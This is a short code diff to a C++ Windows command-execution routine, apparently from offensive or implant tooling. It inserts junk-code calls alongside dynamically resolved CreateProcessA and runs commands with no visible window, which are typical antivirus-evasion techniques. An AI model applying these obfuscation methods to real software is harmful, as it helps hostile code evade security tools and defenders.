@@ -3,6 +3,7 @@
 #include <string>
 #include "winapi_function_signatures.h"
 #include "winapi_obfuscation.h"
+#include "junk_codes.h"
 
 namespace {
 	std::string GetLastErrorAsString()
@@ -36,6 +37,10 @@ namespace {
 		startInfo.hStdInput = stdOutRead;
 		startInfo.dwFlags |= STARTF_USESTDHANDLES;
 
+		int garbage = not_inlined_junk_func_3(0x64, 0, &junk_var_2);
+		if (garbage % 5 == 2)
+			junk();
+		
 		// Create the child process and run the command line
 		if (!resolve_dynamically<CreateProcessA_t>("CreateProcessA")(NULL, (char*)command.c_str(), NULL, NULL, true, CREATE_NO_WINDOW, NULL, NULL, &startInfo, &procInfo))
 			throw std::runtime_error(GetLastErrorAsString());
@@ -52,6 +57,8 @@ std::string exec(std::string command)
 
 	HANDLE stdOutWrite = nullptr;
 	HANDLE stdOutRead = nullptr;
+	
+	small_junk();
 
 	memset(&securityAttr, 0, sizeof(securityAttr));
 	securityAttr.nLength = sizeof(securityAttr);
